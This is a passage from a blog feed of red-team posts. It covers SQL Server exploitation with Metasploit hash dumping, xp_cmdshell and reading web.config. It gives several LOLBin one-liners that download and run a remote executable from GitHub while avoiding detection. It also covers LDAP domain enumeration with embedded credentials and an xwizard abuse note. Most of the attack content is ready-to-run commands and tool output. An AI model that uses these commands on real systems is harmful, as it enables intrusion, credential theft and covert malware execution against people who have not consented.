id="More-Principle-Reference"><a href="#More-Principle-Reference" class="headerlink" title="More Principle Reference"></a>More Principle Reference</h6><pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.volexity.com&#x2F;blog&#x2F;2021&#x2F;03&#x2F;02&#x2F;active-exploitation-of-microsoft-exchange-zero-day-vulnerabilities&#x2F;https:&#x2F;&#x2F;www.praetorian.com&#x2F;blog&#x2F;reproducing-proxylogon-exploit&#x2F;https:&#x2F;&#x2F;testbnull.medium.com&#x2F;ph%C3%A2n-t%C3%ADch-l%E1%BB%97-h%E1%BB%95ng-proxylogon-mail-exchange-rce-s%E1%BB%B1-k%E1%BA%BFt-h%E1%BB%A3p-ho%C3%A0n-h%E1%BA%A3o-cve-2021-26855-37f4b6e06265https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;sGkYS4BSM2ER3ubR6G-xhA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Exchange </tag>
            
            <tag> RCE </tag>
            
            <tag> ProxyLogon </tag>
            
            <tag> CVE-2021-26855 </tag>
            
            <tag> CVE-2021-27065 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sqlserver common attack methods</title>
      <link href="2021/07/24/sqlserver-common-attack-methods/"/>
      <url>2021/07/24/sqlserver-common-attack-methods/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">Default port 1433, NMAP fingerprint is as follows:PORT     STATE SERVICE  VERSION1433&#x2F;tcp open  ms-sql-s Microsoft SQL Server 2012 11.00.2100.00; RTM| ms-sql-ntlm-info:|   Target_Name: ROOTKIT|   NetBIOS_Domain_Name: ROOTKIT|   NetBIOS_Computer_Name: SRV-WEB-KIT|   DNS_Domain_Name: rootkit.org|   DNS_Computer_Name: Srv-Web-Kit.rootkit.org|   DNS_Tree_Name: rootkit.org|_  Product_Version: 6.3.9600Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windowsHost script results:| ms-sql-info:|   192.168.3.73:1433:|     Version:|       name: Microsoft SQL Server 2012 RTM|       number: 11.00.2100.00|       Product: Microsoft SQL Server 2012|       Service pack level: RTM|       Post-SP patches applied: false|_    TCP port: 1433<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="The-system-tables"><a href="#The-system-tables" class="headerlink" title="The system tables"></a>The system tables</h3><pre class="line-numbers language-none"><code class="language-none">Master: Records all system-level informationModel: Template database, such as for database size, collation, recovery model, and other database options, will be used for any database that is later createdMSDB: Arrange alarm and operationTempdb: Space to hold temporary objects or intermediate result setsResouce: read-only, containing the attached system objects that are physically persistent in the resource database and appear in sys mode for each database<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Grammar-supplement"><a href="#Grammar-supplement" class="headerlink" title="Grammar supplement"></a>Grammar supplement</h3><pre class="line-numbers language-none"><code class="language-none">View all databasesSELECT Name FROM Master.. SysDatabases ORDER BY NameSELECT name FROM master.dbo.sysdatabasesView the name of the tableSELECT * FROM #databaseName#.INFORMATION_SCHEMA.TABLES;View service linksEXEC sp_linkedserversSELECT * FROM sys.servers;To view the userselect sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled &#x3D; 1 then &#39;Disabled&#39; else &#39;Enabled&#39; end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id &#x3D; sl.principal_id where sp.type not in (&#39;G&#39;, &#39;R&#39;) order by sp.name;Create a userCREATE LOGIN yangsir WITH PASSWORD &#x3D; &#39;Yangsirnb123&#39;sp_addsrvrolemember &#39;yangsir&#39;, &#39;sysadmin&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="Information-collection"><a href="#Information-collection" class="headerlink" title="Information collection"></a>Information collection</h3><h4 id="use-admin-mssql-mssql-enum-domain-accounts-about-domain-account"><a href="#use-admin-mssql-mssql-enum-domain-accounts-about-domain-account" class="headerlink" title="use admin/mssql/mssql_enum_domain_accounts about domain account"></a>use admin/mssql/mssql_enum_domain_accounts about domain account</h4><pre class="line-numbers language-none"><code class="language-none">msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_enum_domain_accounts) &gt; run[*] Running module against 192.168.3.73[*] 192.168.3.73:1433 - Attempting to connect to the database server at 192.168.3.73:1433 as sa...[+] 192.168.3.73:1433 - Connected.[*] 192.168.3.73:1433 - SQL Server Name: SRV-WEB-KIT[*] 192.168.3.73:1433 - Domain Name: ROOTKIT[+] 192.168.3.73:1433 - Found the domain sid: 010500000000000515000000e23e1be0b3ff69b2200c3dd5[*] 192.168.3.73:1433 - Brute forcing 10000 RIDs through the SQL Server, be patient...[*] 192.168.3.73:1433 -  - ROOTKIT\Administrator[*] 192.168.3.73:1433 -  - ROOTKIT\Guest[*] 192.168.3.73:1433 -  - ROOTKIT\krbtgt[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Admins[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Users[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Guests[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Computers[*] 192.168.3.73:1433 -  - ROOTKIT\Domain Controllers<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="use-admin-mssql-mssql-enum-sql-logins-about-login-user"><a href="#use-admin-mssql-mssql-enum-sql-logins-about-login-user" class="headerlink" title="use admin/mssql/mssql_enum_sql_logins about login user"></a>use admin/mssql/mssql_enum_sql_logins about login user</h4><pre class="line-numbers language-none"><code class="language-none">msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_enum_sql_logins) &gt; run[*] Running module against 192.168.3.73[*] 192.168.3.73:1433 - Attempting to connect to the database server at 192.168.3.73:1433 as sa...[+] 192.168.3.73:1433 - Connected.[*] 192.168.3.73:1433 - Checking if sa has the sysadmin role...[+] 192.168.3.73:1433 - sa is a sysadmin.[*] 192.168.3.73:1433 - Setup to fuzz 300 SQL Server logins.[*] 192.168.3.73:1433 - Enumerating logins...[+] 192.168.3.73:1433 - 35 initial SQL Server logins were found.[*] 192.168.3.73:1433 - Verifying the SQL Server logins...[+] 192.168.3.73:1433 - 10 SQL Server logins were verified:[*] 192.168.3.73:1433 -  - ##MS_PolicyEventProcessingLogin##[*] 192.168.3.73:1433 -  - ##MS_PolicyTsqlExecutionLogin##[*] 192.168.3.73:1433 -  - NT AUTHORITY\SYSTEM[*] 192.168.3.73:1433 -  - NT SERVICE\MSSQLSERVER[*] 192.168.3.73:1433 -  - NT SERVICE\SQLSERVERAGENT[*] 192.168.3.73:1433 -  - NT SERVICE\SQLWriter[*] 192.168.3.73:1433 -  - NT SERVICE\Winmgmt[*] 192.168.3.73:1433 -  - ROOTKIT\dbadmin[*] 192.168.3.73:1433 -  - ROOTKIT\sqladmin[*] 192.168.3.73:1433 -  - sa[*] Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="use-auxiliary-admin-mssql-mssql-findandsampledata-some-interest-data"><a href="#use-auxiliary-admin-mssql-mssql-findandsampledata-some-interest-data" class="headerlink" title="use auxiliary/admin/mssql/mssql_findandsampledata some interest data"></a>use auxiliary/admin/mssql/mssql_findandsampledata some interest data</h4><pre class="line-numbers language-none"><code class="language-none">msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_findandsampledata) &gt; run[*] 192.168.3.73:1433     - Attempting to connect to the SQL Server at 192.168.3.73:1433...[+] 192.168.3.73:1433     - Successfully connected to 192.168.3.73:1433[*] 192.168.3.73:1433     - Attempting to retrieve data ...[*] 192.168.3.73:1433     - SRV-WEB-KIT                   , LazyOA                        , dbo                           , Sys_User                      , PassWord                      , nvarchar                      , cfcd208495d565ef66e7dff9f98764, 5[*] 192.168.3.73:1433     - SRV-WEB-KIT                   , LazyOA                        , dbo                           , WC_Forum_User                 , PasswordType                  , int                           , 1                             , 1[*] 192.168.3.73:1433     - SRV-WEB-KIT                   , LazyOA                        , dbo                           , WM_Users                      , Password                      , nvarchar                      , 123                           , 7[*] 192.168.3.73:1433     - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="use-auxiliary-scanner-mssql-mssql-hashdump-get-password"><a href="#use-auxiliary-scanner-mssql-mssql-hashdump-get-password" class="headerlink" title="use auxiliary/scanner/mssql/mssql_hashdump  get password"></a>use auxiliary/scanner/mssql/mssql_hashdump  get password</h4><pre class="line-numbers language-none"><code class="language-none">msf6 auxiliary(scanner&#x2F;mssql&#x2F;mssql_hashdump) &gt; run[*] 192.168.3.73:1433     - Instance Name: nil[+] 192.168.3.73:1433     - Saving mssql12 &#x3D; sa:020008da5345d7acb57f6e081ab60b39cdd31a939c06d3ad751fa9fcdad7d17d864013f33f6bf013dd74e2559a2b82deb5776167ce4db13632b9d43ca62b17d335320f1e2399[+] 192.168.3.73:1433     - Saving mssql12 &#x3D; ##MS_PolicyEventProcessingLogin##:0200ce4fb17bbcb091201639a75dfef7681df56c695e199076214dfee2308db01792cb4266d9e650aeb823d694359f9b32b4250954ae0c399a7f59b33ca68eaa9c43a173adf4[+] 192.168.3.73:1433     - Saving mssql12 &#x3D; ##MS_PolicyTsqlExecutionLogin##:0200400c2a7a6af4d09e573e8a6ef82c3d171d3d77103df288f079c35b012b94e8bb6b8c26b6902cd0a3f37419bdab1fb8f83c1d0536e4bd374785c6623907139b1102e9f681[*] 192.168.3.73:1433     - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Elevated-privileges"><a href="#Elevated-privileges" class="headerlink" title="Elevated privileges"></a>Elevated privileges</h3><pre class="line-numbers language-none"><code class="language-none">use admin&#x2F;mssql&#x2F;mssql_escalate_execute_as need IMPERSONATION use admin&#x2F;mssql&#x2F;mssql_escalate_dbowner need dbowner<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="Command-execution"><a href="#Command-execution" class="headerlink" title="Command execution"></a>Command execution</h3><h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><pre class="line-numbers language-none"><code class="language-none">use admin&#x2F;mssql&#x2F;mssql_exec use exploit&#x2F;windows&#x2F;mssql&#x2F;mssql_payloaduse exploit&#x2F;windows&#x2F;mssql&#x2F;mssql_linkcrawler msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_exec) &gt; run[*] Running module against 192.168.3.73[*] 192.168.3.73:1433 - The server may have xp_cmdshell disabled, trying to enable it...[*] 192.168.3.73:1433 - SQL Query: EXEC master..xp_cmdshell &#39;whoami&#39; output ------ rootkit\dbadmin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="crackmapexec"><a href="#crackmapexec" class="headerlink" title="crackmapexec"></a>crackmapexec</h4><pre class="line-numbers language-none"><code class="language-none">crackmapexec mssql 192.168.3.73 -d rootkit.org -u sqladmin -p Admin12345 -x &quot;whoami&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724132256320.png"></p><h4 id="use-xpcmdshell"><a href="#use-xpcmdshell" class="headerlink" title="use xpcmdshell"></a>use xpcmdshell</h4><pre class="line-numbers language-none"><code class="language-none">open xpcmdshellsp_configure &#39;show advanced options&#39;, &#39;1&#39;RECONFIGUREsp_configure &#39;xp_cmdshell&#39;, &#39;1&#39;RECONFIGUREthen use theseEXEC master..xp_cmdshell &#39;whoami&#39;EXEC xp_cmdshell &quot;whoami&quot;;EXEC master.dbo.xp_cmdshell &#39;cmd.exe dir c:&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724132756918.png"></p><pre class="line-numbers language-none"><code class="language-none">get direxecute master..xp_dirtree &#39;c:&#39;execute master..xp_dirtree &#39;c:&#39;,1 execute master..xp_dirtree &#39;c:&#39;,1,1 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724134413840.png"></p><pre class="line-numbers language-none"><code class="language-none">python execEXECUTE sp_execute_external_script @language &#x3D; N&#39;Python&#39;, @script &#x3D; N&#39;print(__import__(&quot;getpass&quot;).getuser())&#39;EXECUTE sp_execute_external_script @language &#x3D; N&#39;Python&#39;, @script &#x3D; N&#39;print(__import__(&quot;os&quot;).system(&quot;whoami&quot;))&#39;EXECUTE sp_execute_external_script @language &#x3D; N&#39;Python&#39;, @script &#x3D; N&#39;print(open(&quot;C:\\inetpub\\wwwroot\\web.config&quot;, &quot;r&quot;).read())&#39;EXECUTE sp_execute_external_script @language &#x3D; N&#39;Python&#39;, @script &#x3D; N&#39;import sysprint(sys.version)&#39;GO<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="sqlserver-amp-smbrelay"><a href="#sqlserver-amp-smbrelay" class="headerlink" title="sqlserver&amp;smbrelay"></a>sqlserver&amp;smbrelay</h3><pre class="line-numbers language-none"><code class="language-none">No relevant environment is currently availableyou can read:https:&#x2F;&#x2F;www.netspi.com&#x2F;blog&#x2F;technical&#x2F;network-penetration-testing&#x2F;executing-smb-relay-attacks-via-sql-server-using-metasploit&#x2F;like this:msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_ntlm_stealer) &gt; optionsModule options (auxiliary&#x2F;admin&#x2F;mssql&#x2F;mssql_ntlm_stealer):   Name                 Current Setting  Required  Description   ----                 ---------------  --------  -----------   PASSWORD             admin            no        The password for the specified username   RHOSTS               192.168.3.73     yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;   RPORT                1433             yes       The target port (TCP)   SMBPROXY             0.0.0.0          yes       IP of SMB proxy or sniffer.   TDSENCRYPTION        false            yes       Use TLS&#x2F;SSL for TDS data &quot;Force Encryption&quot;   THREADS              1                yes       The number of concurrent threads (max one per host)   USERNAME             sa               no        The username to authenticate as   USE_WINDOWS_AUTHENT  true             yes       Use windows authentification (requires DOMAIN option set)msf6 auxiliary(admin&#x2F;mssql&#x2F;mssql_ntlm_stealer) &gt; set smbproxy targetip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="about-mssqlclient-py"><a href="#about-mssqlclient-py" class="headerlink" title="about mssqlclient.py"></a>about mssqlclient.py</h3><pre class="line-numbers language-none"><code class="language-none">python3 mssqlclient.py -db master -windows-auth rootkit.org&#x2F;sqladmin:Admin12345@192.168.3.73<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724135209969.png"></p><h3 id="about-sqsh"><a href="#about-sqsh" class="headerlink" title="about sqsh"></a>about sqsh</h3><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Sqlserver%20common%20attack%20methods/image-20210724140056645.png"></p>]]></content>
      
      
      <categories>
          
          <category> Miscellaneous record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Information collection </tag>
            
            <tag> Sqlserver </tag>
            
            <tag> Database </tag>
            
            <tag> Command execution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Some ways to download files remotely from Github</title>
      <link href="2021/07/23/some-ways-to-download-files-remotely-from-github/"/>
      <url>2021/07/23/some-ways-to-download-files-remotely-from-github/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">The goal is to improve the traceability cost, avoid being detected by the traceability, and improve the concealmentExisting documents:https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exeYou need to download to C:\test and execute<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><pre class="line-numbers language-none"><code class="language-none">powershell (new-object System.Net.WebClient).DownloadFile(&#39;https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe&#39;,&#39;C:\test\yang.exe&#39;);start-process &#39;C:\test\yang.exe&#39;powershell (new-object System.Net.WebClient).DownloadFile(&#39;https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe&#39;,&#39;c:\\test\\yang.exe&#39;);start-process &#39;c:\\test\\yang.exe&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="certutil"><a href="#certutil" class="headerlink" title="certutil"></a>certutil</h3><pre class="line-numbers language-none"><code class="language-none">certutil -urlcache -split -f https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe C:\test\yang.exe&amp;&amp;C:\test\yang.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="bitsadmin"><a href="#bitsadmin" class="headerlink" title="bitsadmin"></a>bitsadmin</h3><pre class="line-numbers language-none"><code class="language-none">Slow, not recommendedbitsadmin &#x2F;transfer n https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe C:\test\yang.exe &amp;&amp; C:\test\yang.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="regsvr32"><a href="#regsvr32" class="headerlink" title="regsvr32"></a>regsvr32</h3><pre class="line-numbers language-none"><code class="language-none">Run the regsve32-vbs-download-execregsvr32 &#x2F;s &#x2F;i:https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;download.sct   scrobj.dllUse this:Const adTypeBinary &#x3D; 1Const adSaveCreateOverWrite &#x3D; 2Dim http,adoSet http &#x3D; CreateObject(&quot;Msxml2.ServerXMLHTTP.6.0&quot;)http.SetOption 2, 13056http.open &quot;GET&quot;,&quot;https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe&quot;,Falsehttp.sendSet ado &#x3D; createobject(&quot;Adodb.Stream&quot;)ado.Type &#x3D; adTypeBinaryado.Openado.Write http.responseBodyado.SaveToFile &quot;C:\test\yang.exe&quot;ado.Close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Some%20ways%20to%20download%20files%20remotely%20from%20Github/image-20210723213650376.png"></p><pre class="line-numbers language-none"><code class="language-none">Run the regsve32-JS-ps-download-execregsvr32 &#x2F;u &#x2F;s &#x2F;i:https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;download.sct scrobj.dllUse this:new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;powershell (new-object System.Net.WebClient).DownloadFile(&#39;https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe&#39;,&#39;c:\\test\\yang.exe&#39;);start-process &#39;c:\\test\\yang.exe&#39;&quot;,0,true);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="mshta"><a href="#mshta" class="headerlink" title="mshta"></a>mshta</h3><pre class="line-numbers language-none"><code class="language-none">Mshta supports http&amp;https, where the script must be an HTML page to run, otherwise it will be parsed as textThe local environment is used as an examplemshta http:&#x2F;&#x2F;127.0.0.1&#x2F;calc.hta<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Some%20ways%20to%20download%20files%20remotely%20from%20Github/image-20210723222036052.png"></p><pre class="line-numbers language-none"><code class="language-none">Make sure the download executes successfully to PowerShellpowershell (new-object System.Net.WebClient).DownloadFile(&#39;https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;Yangsir-blog-img&#x2F;raw&#x2F;main&#x2F;calc.exe&#39;,&#39;C:\test\yang.exe&#39;);start-process &#39;C:\test\yang.exe&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Some%20ways%20to%20download%20files%20remotely%20from%20Github/image-20210723222405255.png"></p><h3 id="IEExec"><a href="#IEExec" class="headerlink" title="IEExec"></a>IEExec</h3><pre class="line-numbers language-none"><code class="language-none">Encountered pit point, not yet solved, later reviewcd C:\Windows\Microsoft.NET\Framework\v2.0.50727\caspol -s offIEExec http:&#x2F;&#x2F;192.168.3.8&#x2F;yang.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Some%20ways%20to%20download%20files%20remotely%20from%20Github/image-20210723223302420.png"></p>]]></content>
      
      
      <categories>
          
          <category> Miscellaneous record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> File download </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Supplementary information about obtaining LDAP information</title>
      <link href="2021/07/23/supplementary-information-about-obtaining-ldap-information/"/>
      <url>2021/07/23/supplementary-information-about-obtaining-ldap-information/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">The project encountered a pit point, some complement, the method of obtaining information to complement, in order to better bypass AV<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="csvde"><a href="#csvde" class="headerlink" title="csvde"></a>csvde</h2><pre class="line-numbers language-none"><code class="language-none">The target information is exported, and the output product is in CSV format. The actual Chinese exported will have garbled charactersMain applicable versions:Windows Server 2003, Windows Server 2008, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012, Windows Server 2003 with SP1, Windows 8Operation Manual:https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;previous-versions&#x2F;windows&#x2F;it-pro&#x2F;windows-server-2012-r2-and-2012&#x2F;cc732101(v&#x3D;ws.11)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h3><pre class="line-numbers language-none"><code class="language-none">All information in the domain:csvde -f 1.csvInformation about all users in the domain:csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;person))&quot;Information about all machines in the domain:csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;computer))&quot;Information about all groups in the domain:csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;group))&quot;Information about all administrator groups in the domain:csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;group)(name&#x3D;Domain Admins))&quot;All OU information in the domain:csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;organizationalUnit))&quot;All domain user names in the domain:csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;person))&quot; -l SamAccountNameAll computer names in the domain:csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;computer))&quot; -l nameRemote export:Csvde -s 192.168.3.144 -a rootkit.org\sqladmin Admin12345 -f all.csv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ldifde"><a href="#ldifde" class="headerlink" title="ldifde"></a>ldifde</h2><pre class="line-numbers language-none"><code class="language-none">Main applicable versions:Windows Server 2003, Windows Server 2008, Windows Server 2008 R2, Windows Server 2012, Windows Server 2003 with SP1, Windows 8Operation Manual:https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;previous-versions&#x2F;windows&#x2F;it-pro&#x2F;windows-server-2012-r2-and-2012&#x2F;cc731033(v&#x3D;ws.11)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Supplementary%20information%20about%20obtaining%20LDAP%20information/image-20210722152525595.png" alt="image"></p><h3 id="Actual-use-1"><a href="#Actual-use-1" class="headerlink" title="Actual use"></a>Actual use</h3><pre class="line-numbers language-none"><code class="language-none">All information in the domain:ldifde -f 2.txtInformation about all users in the domain:ldifde -r &quot;(&amp;(objectCategory&#x3D;person))&quot; -f 2.txtInformation about all machines in the domain:ldifde -r &quot;(&amp;(objectCategory&#x3D;computer))&quot; -f 2.txtInformation about all groups in the domain:ldifde -r &quot;(&amp;(objectCategory&#x3D;group))&quot; -f 2.txtInformation about all administrator groups in the domain:ldifde -r &quot;(&amp;(objectCategory&#x3D;group)(name&#x3D;Domain Admins))&quot; -f 2.txtAll OU information in the domain:ldifde -r &quot;(&amp;(objectCategory&#x3D;organizationalUnit))&quot; -f 2.txtAll domain user names in the domain:ldifde -r &quot;(&amp;(objectCategory&#x3D;person))&quot; -l SamAccountName -f 2.txtAll computer names in the domain:ldifde -r &quot;(&amp;(objectCategory&#x3D;computer))&quot; -l name -f 2.txtRemote export:Ldifde -s 192.168.3.144 -a rootkit.org\sqladmin Admin12345 -f 2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Supplementary%20information%20about%20obtaining%20LDAP%20information/image-20210722152733426.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> Essays record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> Intranet Information Collection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xwizard Microsoft program use white and black</title>
      <link href="2021/07/23/xwizard-microsoft-program-use-white-and-black/"/>
      <url>2021/07/23/xwizard-microsoft-program-use-white-and-black/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">xwizard.exe use xwizards.dll，Support win7 and above system<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145222987.png" alt="image"></p><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><pre class="line-numbers language-none"><code class="language-none">such as Path: C:\Windows\System32Use case:xwizard processXMLFile 1.txtxwizard RunWizard &#x2F;u &#123;11111111-1111-1111-1111-111111111111&#125;xwizard RunPropertySheet &#x2F;u &#123;11111111-1111-1111-1111-111111111111&#125;Note that the GUID length needs to be fixed, otherwise an error will be reported<span aria-hidden="true" 